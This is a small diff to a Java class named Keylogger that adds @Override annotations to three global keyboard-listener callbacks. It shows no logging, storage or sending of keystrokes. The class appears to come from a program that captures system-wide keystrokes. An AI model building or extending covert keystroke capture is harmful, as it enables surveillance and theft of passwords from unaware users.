@@ -65,6 +65,7 @@ public class Keylogger
 	}
 
 	private static NativeKeyListener listener = new NativeKeyListener() {
+		@Override
 		public void nativeKeyPressed(NativeKeyEvent event)
 		{
 			switch (event.getKeyCode())
@@ -180,6 +181,7 @@ public class Keylogger
 		    }
 		}
 
+		@Override
 		public void nativeKeyReleased(NativeKeyEvent event)
 		{
 			switch (event.getKeyCode())
@@ -193,6 +195,7 @@ public class Keylogger
 			}
 		}
 
+		@Override
 		public void nativeKeyTyped(NativeKeyEvent event)
 		{
 			int key = event.getKeyChar();
